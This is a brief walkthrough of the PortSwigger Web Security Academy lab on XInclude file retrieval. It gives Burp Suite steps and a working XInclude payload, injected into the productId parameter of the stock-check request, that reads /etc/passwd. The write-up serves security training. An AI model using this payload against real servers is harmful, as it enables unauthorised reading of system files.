# [Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack)

> exploit the check store request with XInclude inject into request

- open burp
- open page in browser
- navigate to a product
- click "check store" button
- check history in burp
- send the `/product/stock` request to the repeater
- will see the following:

```
POST /product/stock HTTP/2
...
productId=3&storeId=1
```

- no xml in the request
- inject the following `XInclude` instead the productId value **(more details about XInclude [here](?file=portswigger/basic/xinclude))**

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

- what will look like

```
POST /product/stock HTTP/2
...
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
